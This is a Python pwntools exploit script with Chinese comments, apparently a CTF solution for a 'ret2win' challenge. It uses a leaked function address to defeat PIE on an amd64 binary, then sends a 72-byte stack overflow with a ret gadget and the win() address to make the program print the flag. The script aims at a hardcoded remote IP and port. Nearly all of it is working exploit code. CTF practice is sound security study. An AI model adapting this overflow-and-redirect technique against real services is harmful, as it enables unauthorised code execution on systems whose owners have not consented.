#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ret2win —— PIE + 栈溢出到 win()，pwntools 版（对齐手搓的 p1.py）

附件: attachments/pwn（amd64, PIE, NX, Full RELRO, 无 canary, 未 strip）
win: 0x1169（win 里 lea "cat ./flag" -> system）
main: 0x117f

程序开局打印 `gift: %p` 泄露 win() 运行时地址：
  base = gift - 0x1169
  ret  = base + 0x101A     # 一条 ret，对齐栈（system 里 movaps 需要 16 字节对齐）
  payload = b"A"*72 + p64(ret) + p64(gift)
72 是 read 缓冲区到返回地址的偏移（手搓脚本 p1.py 已标定）。

用法:
  python exp.py                       # 默认远程 219.216.64.241:39546
  python exp.py HOST PORT             # 换目标
"""
import re
import sys

from pwn import context, flat, p64, remote

HOST = "219.216.64.241"
PORT = 39546
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])

WIN_OFF = 0x1169
RET_OFF = 0x101A
OFFSET = 72

FLAG_RE = re.compile(r"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")

context.arch = "amd64"
context.log_level = "error"


def main():
    p = remote(HOST, PORT)
    banner = p.recvline(timeout=5)
    print("[*] banner:", banner)

    m = re.search(rb"0x([0-9a-fA-F]+)", banner)
    if not m:
        raise SystemExit("[-] 没拿到 gift 泄露")
    win = int(m.group(1), 16)
    base = win - WIN_OFF
    ret = base + RET_OFF
    print("[*] win  = %#x" % win)
    print("[*] base = %#x" % base)
    print("[*] ret  = %#x" % ret)

    payload = flat(b"A" * OFFSET, p64(ret), p64(win))
    print("[*] payload (%d bytes): %s" % (len(payload), payload.hex()))
    p.sendline(payload)

    try:
        out = p.recvall(timeout=5)
    except EOFError:
        out = b""
    text = out.decode("utf-8", "replace")
    print("[*] output:", text.strip()[:500])

    fm = FLAG_RE.search(text)
    if fm:
        print("[+] FLAG:", fm.group(0))
        return 0
    print("[-] 未取到 flag（检查偏移/端口）")
    return 1


if __name__ == "__main__":
    sys.exit(main())
